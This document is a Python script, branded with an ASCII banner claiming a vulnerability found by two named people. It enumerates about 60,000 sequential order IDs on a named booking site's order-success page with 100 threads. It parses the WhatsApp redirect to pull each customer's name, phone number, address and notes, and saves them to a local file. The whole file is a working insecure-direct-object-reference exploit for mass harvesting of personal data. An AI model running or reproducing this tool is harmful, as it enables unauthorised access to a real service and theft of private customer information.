from pystyle import Colorate, Colors
from bs4 import BeautifulSoup
import concurrent.futures
import urllib.parse
import requests
import codecs
import ctypes
import sys
import os

def TitoloGaming(title):
    title_bytes = title.encode('cp1252')
    ctypes.windll.kernel32.SetConsoleTitleA(title_bytes)

def Banner():
    ilTesto = r""" 
 ▄▄▄▄    ▒█████   ▒█████  ▒██   ██▒ ██▓▄▄▄█████▓
▓█████▄ ▒██▒  ██▒▒██▒  ██▒▒▒ █ █ ▒░▓██▒▓  ██▒ ▓▒
▒██▒ ▄██▒██░  ██▒▒██░  ██▒░░  █   ░▒██▒▒ ▓██░ ▒░
▒██░█▀  ▒██   ██░▒██   ██░ ░ █ █ ▒ ░██░░ ▓██▓ ░ 
░▓█  ▀█▓░ ████▓▒░░ ████▒░▒██▒ ▒██▒░██░  ▒██▒ ░ 
░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░░▓    ▒ ░░   
▒░▒   ░   ░ ▒ ▒░   ░ ▒ ▒░ ░░   ░▒ ░ ▒ ░    ░    
 ░    ░ ░ ░ ░ ▒  ░ ░ ░ ▒   ░    ░   ▒ ░  ░      
   Vulnerabily Found By FakeException & Hisako
"""

    os.system("cls" if os.name == "nt" else "clear")
    print(Colorate.Horizontal(Colors.yellow_to_red, ilTesto))
    

MAX_WORKERS = 100

def GetOrder(order):
    try:
        url = f"https://booxit.it/order/success?order={order}&whatsapp=yes"
        response = requests.get(url)
        if response.status_code != 200:
            raise Exception(f"Failed to load page. Status code: {response.status_code}")
        html_content = response.text
        meta_refresh_content = extract_meta_refresh_content(html_content)
        decoded_text = urllib.parse.unquote(meta_refresh_content)
        data = get_details(decoded_text)
        return data
    except Exception as e:
        print(f"\033[91mError fetching order: {e}\033[0m")
        return None

def get_details(decoded_text):
    data = decoded_text.replace("+", " ").split("\n")
    data_to_return = []
    for i, line in enumerate(data):
        if line.startswith("Nome") or line.startswith("Cellulare") or line.startswith("Indirizzo"):
            data_to_return.append(line)
        elif "Nota" in line:
            if i > 0:
                note = "Nota: " + " ".join(line.split("Nota: ")[1:])
            else:
                note = "Nota: " + " ".join(line.split("Nota: ")[1:])
            data_to_return.append(note)
    return data_to_return
    
def extract_meta_refresh_content(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    meta_tag = soup.find('meta', attrs={'http-equiv': 'refresh'})
    if meta_tag is None:
        return "No meta refresh tag found"
    content = meta_tag.get('content')
    if content is None or content.strip() == "":
        return "No content found in meta refresh tag"
    return content

def Save_order(order, data):
    LyonWGF = "dati.txt"
    with codecs.open(LyonWGF, 'a', encoding='utf-8') as f:
        f.write(f"Numero ordine: {order}\n")
        for line in data:
            f.write(line + "\n")
        f.write("---------------------\n")
    print(f"\033[92mOrder {order} saved successfully\033[0m")

def main():
    orders = list(range(1, 60250))
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(GetOrder, order): order for order in orders}
        for future in concurrent.futures.as_completed(futures):
            order = futures[future]
            try:
                data = future.result()
                if data is not None and len(data) > 0:
                    Save_order(order, data)
                else:
                    print(f"\033[91mError fetching order {order}\033[0m")
            except Exception as e:
                print(f"\033[91mError fetching order: {e}\033[0m")

Banner()
TitoloGaming("Booxit Fetcher")
if __name__ == "__main__":
    main()
    
    
    
    
